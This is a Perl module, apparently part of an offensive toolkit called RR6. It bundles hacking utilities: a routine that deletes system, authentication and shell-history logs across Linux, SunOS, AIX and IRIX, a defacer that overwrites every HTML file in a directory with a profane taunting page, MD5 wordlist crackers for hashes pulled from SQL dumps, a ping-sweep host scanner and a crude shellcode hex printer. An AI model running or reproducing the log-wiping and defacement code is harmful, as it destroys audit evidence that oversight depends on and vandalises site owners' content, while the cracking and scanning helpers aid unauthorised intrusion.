# Package is just for calling the perl only tools and function
package Offensive_Security;

use Digest::MD5 qw(md5_hex); 
use File::Fetch;
use Cwd;
use English;
use File::Basename;
use Image::ExifTool;
use feature 'say';
use HTTP::Tiny;
use utf8;
use open ':std', ':encoding(UTF-8)';
use Data::HexDump;
use String::CRC32;
use Fcntl;
use Net::Ping;
use Net::Netmask;
use Net::Traceroute;
use POSIX 'WNOHANG';




my $resume = 1;
my @hashes;
my $blue                   = "\033[34m";
my $Bold_Blue              = "\033[1;34m";
my $red                    = "\033[31m";
my $wht                    = "\033[37m";
my $BLK                    = "\033[0;30m";
my $RED                    = "\033[0;31m";
my $GRN                    = "\033[0;32m";
my $YEL                    = "\033[0;33m";
my $BLU                    = "\033[0;34m";
my $MAG                    = "\033[0;35m";
my $CYN                    = "\033[0;36m";
my $WHT                    = "\033[0;37m";
my $OUIL                   = "http://standards-oui.ieee.org/oui.txt";
# regex 
my $mactexta               = "/((?:[0-9a-f]{2}[:-]){5}[0-9a-f]{2})/i";
my $port_ip_regex_match    = "/(\\d{1,3}\.\\d{1,3}\.\\d{1,3}\.\\d{1,3}\:\\d{1,5})/";
my $port_num_regex_match   = "^([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])";
# http 
my $Client = HTTP::Tiny->new();
my $file = "banner.txt";
my $extension = ".png";
# files 
my $basename               = File::Basename::basename($PROGRAM_NAME);
my $abs_path               = Cwd::abs_path($PROGRAM_NAME);
my $dirname                = File::Basename::dirname($abs_path);
my $cwd                    = Cwd::cwd();
my $oui_faa                = "/oui.txt";
my $method = "use_tcp";


# constants 
use constant VERSION => "1.6";
# arrays and major lists 
my @linux = ("/var/log/lastlog", "/var/log/telnetd", "/var/run/utmp",  
                 "/var/log/secure","/root/.ksh_history", "/root/.bash_history",  
                 "/root/.bash_logut", "/var/log/wtmp", "/etc/wtmp",  
                 "/var/run/utmp", "/etc/utmp", "/var/log", "/var/adm",  
                 "/var/apache/log", "/var/apache/logs", "/usr/local/apache/logs",  
                 "/usr/local/apache/logs", "/var/log/acct", "/var/log/xferlog",  
                 "/var/log/messages/", "/var/log/proftpd/xferlog.legacy",  
                 "/var/log/proftpd.xferlog", "/var/log/proftpd.access_log",  
                 "/var/log/httpd/error_log", "/var/log/httpsd/ssl_log",  
                 "/var/log/httpsd/ssl.access_log", "/etc/mail/access",  
                 "/var/log/qmail", "/var/log/smtpd", "/var/log/samba",  
                 "/var/log/samba.log.%m", "/var/lock/samba", "/root/.Xauthority",  
                 "/var/log/poplog", "/var/log/news.all", "/var/log/spooler",  
                 "/var/log/news", "/var/log/news/news", "/var/log/news/news.all",  
                 "/var/log/news/news.crit", "/var/log/news/news.err", "/var/log/news/news.notice",  
                 "/var/log/news/suck.err", "/var/log/news/suck.notice",  
                 "/var/spool/tmp", "/var/spool/errors", "/var/spool/logs", "/var/spool/locks",  
                 "/usr/local/www/logs/thttpd_log", "/var/log/thttpd_log",  
                 "/var/log/ncftpd/misclog.txt", "/var/log/nctfpd.errs",  
                 "/var/log/auth");  

my @sunos = ("/var/adm/messages", "/var/adm/aculogs", "/var/adm/aculog",  
                 "/var/adm/sulog", "/var/adm/vold.log", "/var/adm/wtmp",  
                 "/var/adm/wtmpx", "/var/adm/utmp", "/var/adm/utmpx",  
                 "/var/adm/log/asppp.log", "/var/log/syslog",  
                 "/var/log/POPlog", "/var/log/authlog", "/var/adm/pacct",  
                 "/var/lp/logs/lpsched", "/var/lp/logs/requests",  
                 "/var/cron/logs", "/var/saf/_log", "/var/saf/port/log"); 

my @aix = ("/var/adm/pacct", "/var/adm/wtmp", "/var/adm/dtmp", "/var/adm/qacct",    
            "/var/adm/sulog", "/var/adm/ras/errlog", "/var/adm/ras/bootlog",  
            "/var/adm/cron/log", "/etc/utmp", "/etc/security/lastlog",  
            "/etc/security/failedlogin", "usr/spool/mqueue/syslog");      
         
my @irix = ("/var/adm/SYSLOG", "/var/adm/sulog", "/var/adm/utmp", "/var/adm/utmpx",  
            "/var/adm/wtmp", "/var/adm/wtmpx", "/var/adm/lastlog/",  
            "/usr/spool/lp/log", "/var/adm/lp/lp-errs", "/usr/lib/cron/log",  
            "/var/adm/loginlog", "/var/adm/pacct", "/var/adm/dtmp",  
            "/var/adm/acct/sum/loginlog", "var/adm/X0msgs", "/var/adm/crash/vmcore",  
            "/var/adm/crash/unix");



my @build_hex_JPG = (
    "\xff\xd8",
    "\xff\xdb",
    pack('S>', 67),
    "\x00" . "\x01" x 64,
    "\xff\xc2",
    "\x00\x0b",
    "\x08\x00\x01\x00\x01\x01\x01\x11\x00",
    "\xff\xc4",
    "\x00\x14",
    "\x00\x01\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00\x03",
    "\xff\xda",
    "\x00\x08",
    "\x01\x01\x00\x00\x00\x01\x3f",
    "\xff\xd9",
);


my $def = '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <p>
  ______________
< fuck your HTML >
  --------------
         \   ^__^ 
          \  (oo)\_______
             (__)\       )\/\
                 ||----w |
                 ||     ||
      
      HEHEHEHE LULZ, Gotta love the cow 
      Get fucked by literal fucking perl, a lang from the 80s XD
      S_C_A_R_E | S_E_C_U_R_I_T_Y 
      Copywrite -> FUCK YOU YOU FUCKING BASTARDS!!!!!!
    </p>
</body>
</html>
'; 

=head1


The section below head1 in POD is all offline attacks and functions for rr6's main.pl file

=cut




# OS cleaner, small support from and older list and script, modernized

sub log_clean_old{
    my $resume = 1;  
    while($resume == 1) {  
    print "\n[+] Operating system> ";  
    chomp(my $os = <STDIN>);  
    if($os eq "linux"){  
        print "[+]Linux Selected...\n"; 
        print "[+]Logs Located...\n"; 
        unlink @linux; 
        print "[+]Logs Successfully Deleted...\n";  
    } 
    if($os eq "sunos"){   
        print "[+]SunOS Selected...\n";   
        print "[+]Logs Located...\n";   
        unlink @sunos; 
        print "[+]Logs Successfully Deleted...\n"; 
    } 
    if($os eq "aix"){  
        print "[+]Aix Selected...\n";   
        print "[+]Logs Located...\n"; 
        unlink @aix; 
        print "[+]Logs Successfully Deleted...\n"; #
    } 
    if($os eq "irix"){
        print "[+]Irix Selected...\n";   
        print "[+]Logs Located...\n";  
        unlink @irix; #
        print "[+]Logs Successfully Deleted...\n";  
    }
    else {
        print "\n\n[-] Not an OS that is supported| Support for <irix, sunos, linux, aix>\n";
        exit;
    }
}
}

# ip hex translation
sub ip_to_hex{
    my $ip = shift;
    die("[-] Err: Offensive Security Module RR6: An address was not provided") unless $ip;
    my @octets = split(/\./, $ip);
    print "[+] IP $ip => 0x";
    foreach my $octet(@octets) {
        $octet =~ s/$octet/sprintf("%X",$octet)/eg;
        print $octet
    }
    print "\n"; 
}


# MD5 hash matcher 

sub hash_match_MD5{
    my $hashlist=shift;
    my $wordlist=shift;
    open(HASH,$hashlist) or die "[-] Error: Could not open hash file < $hashlist > $!\n";
    chomp(my $hash=<HASH>);
    close(HASH);
    if(length($hash)!=32){
        die "[-] Hash $hash is not a valid MD5, hash did not have a length of 32";
    }
    if($hash !~ /\d|[a-f]{32}/g){
        die "[-] Hash $hash is not a valid MD5, hash did not match the regex string";

    }
    open(WLIST,$wordlist) or die "Could not open wordlist: $wordlist > $!\n";

    while(<WLIST>){
        chomp($_);
        chomp(my $md5=md5_hex($_));
        if($md5 eq $hash){
            die "\n[+] \tPassword matched:> $hash == $_\n\n";
        }
    }
    close(WLIST);
    print "[-] Hash did not match to any others that were generated: FAIL: \n"; 
}

# update OUI
sub OUI_Update{
    my $savepath               = shift or getcwd;
    print "$YEL [+] Fetching new OUI list....\n";
    my $fetcher = File::Fetch->new(uri => $OUIL);
    my $where = $fetcher->fetch(to => $savepath) or die $fetcher->error;
    printf "$GRN [+] Saved new OUI < %s > file to < %s > ", $fetcher->output_file, $where;
}


# check through oui
sub oui_lookup {
  my $mac_address = shift;
  $mac_address =~ s/:/-/g;
  my $oui = substr $mac_address, 0, 8;
  open (my $oui_file, '<', $cwd.$oui_faa) or die $!;
  while (my $line = <$oui_file>)
  {
    if($line =~ /$oui/i)
    {
      my ($address, $manufacturer_name) = split /\t+/, $line;
      return "$manufacturer_name";
      last;
    }
  }
  return "Unknown";
}





# file defacer for HTML files, offline 



sub deface{
    my $filepath = shift;
    my $main_filepath = $filepath . "/*.html";
    print "Walking... -> $main_filepath";

    print "[+]DEFACING...\n"; 
    print"[+]DEFACING ALL .html FILES IN DIRECTORY\n"; 
    my @html = glob($main_filepath); #Files 
    foreach my $deface(@html) {
    print "[+] HIT      -> $deface\n";
    print "[+] Defacing -> $deface\n"; 
    open(DEFACE, '>', $deface); 
    print DEFACE $def || print "[-]Fucked up $!\n"; 
    close(DEFACE) 
    }  
}

# function to table EXIF data
#
# Same table as above in the table subroutine from package TABLE
sub file_exif_table{

    my $exif = new Image::ExifTool;
    # make it shift to take a argument from the subroutine
    my $info = $exif->ImageInfo(shift);
    my @cols = qw/Data/;
    push @cols,
        +{
        title => "After DATA EXIF",
        align => "center",
        };
    my $sep = \'│';
    my $major_sep = \'║';
    my $tb        = Text::Table->new( $sep, " Data Number ", $major_sep,( map { +( ( ref($_) ? $_ : " $_ " ), $sep ) } @cols ) );
    my $num_cols = @cols;
    foreach (keys %$info) {
        $tb->load( [1, $_,    $$info{$_}] );
    }


    my $make_rule = sub {
        my ($args) = @_;
    
        my $left      = $args->{left};
        my $right     = $args->{right};
        my $main_left = $args->{main_left};
        my $middle    = $args->{middle};
    
        return $tb->rule(
            sub {
                my ( $index, $len ) = @_;
    
                return ( '─' x $len );
            },
            sub {
                my ( $index, $len ) = @_;
    
                my $char = (
                    ( $index == 0 )             ? $left
                    : ( $index == 1 )             ? $main_left
                    : ( $index == $num_cols + 1 ) ? $right
                    :                               $middle
                );
    
                return $char x $len;
            },
        );
    };
    my $start_rule = $make_rule->(
        {
            left      => '┌',
            main_left => '╥',
            right     => '┐',
            middle    => '┬',
        }
    );
    my $mid_rule = $make_rule->(
        {
            left      => '├',
            main_left => '╫',
            right     => '┤',
            middle    => '┼',
        }
    );
    my $end_rule = $make_rule->(
        {
            left      => '└',
            main_left => '╨',
            right     => '┘',
            middle    => '┴',
        }
    );
    print "\n\033[37m\n", $start_rule, $tb->title,( map { $mid_rule, $_, } $tb->body() ), $end_rule;
    print "\n\n\n"
}

sub host_discover{
    my $netmask = Net::Netmask->new2(shift) or die Net::Netmask::errstr;

    print "Starting scan on netmask  -> $netmask\n";



    print "\n___COL_______HOST_________STATE____BOOL__\n";
    for my $ip_address ($netmask->enumerate)
    {
    my $parent = fork();
    unless ($parent)
    {
        # do this here to keep the msg sequence at 1 for each host pinged
        my $sender  = Net::Ping->new(shift || 'tcp', shift || 5);
        if ($sender->ping($ip_address))
        {
        if ($sender->{proto} eq 'syn')
        {
            # wait for ACK response or timeout
            exit 0 unless $sender->ack($ip_address);
        }
        print "Address -> $ip_address \t| Alive | TRUE  |\n";
        }
        exit 0;
    }
    }
    # wait on forked processes to finish
    until (waitpid(-1, WNOHANG) == -1) {};
    print "-----------------------------------------\n";
}

#host_discover("10.0.0.1/24", "tcp");

# traceroute(domain)
sub traceroute{
    my $domain = shift;
    my $tracer = Net::Traceroute->new(host=>$domain,$method=>1);
    for(my $i=1; $i <= $tracer->hops;$i++){
        my $hop = $tracer->hop_query_host($i,0);
        my $t1 = $tracer->hop_query_time($i,0);
        my $ms = $tracer->hop_query_stat($i,0);
        my $qh = $tracer->hop_queries($i);
        say "IPA -> ", $hop, "\t| Time ", $t1, " \t| Status ", $ms, "\t|Query Count ", $qh;
    }
}


sub open_and_dump{
    my $file = shift;
    my $dictionary = shift;
    print "\033[32mSetting: using files - $file | $dictionary\n";
    open(my $QLF, $file) or die $!;
    my @hf = $QLF;
    foreach my $line (@hf) {
        if ($line =~ m/'([0-9a-zA-Z]+)\'\, \'([0-9a-fA-F]{32})\'/g) {
            push(@hashes, "$1:$2");
            print "<RR6> SQL Dumper: Found hash $1:$2\n";
        }
    }
    print "<RR6> SQL Dumper: Found hashes -> ".($#hashes + 1).".\n";
    # crack hashes
    print "\033[36mSetting: Opening Wordlist - $dictionary\n";
    open(my $D, $dictionary) or die $!;
    foreach (@hashes) {
        my ($user, $hash) = split(":", $_);
        my $foundhash = 0;
        seek(D, 0, 0);
        while (chomp(my $line = <D>)) {
            if ($hash eq md5_hex($line)) {
                print "<RR6> SQL Dumper: Cracked hash for user $user : $line\n";
                $foundhash = 1;
                my $num_cracked++;
                last;
            }
        }
    }
    close(D);
    print "<RR6> Stat Module: Attempted to crack all hashes [ MD5 ] \n"
}

sub shellcode_gen{
    my $x1 = shift;
    my $data = "$x1";
    chomp($data);
    my @values = split(undef,$data);
    print ("\033[31m\n\n##############################################################\033[39m\n\n");
    foreach my $val (@values) {chomp($val); print '\x'; print unpack(H8,"$val");}
    print "\n";
}




# EOM ( End Of Module or EOF)
1;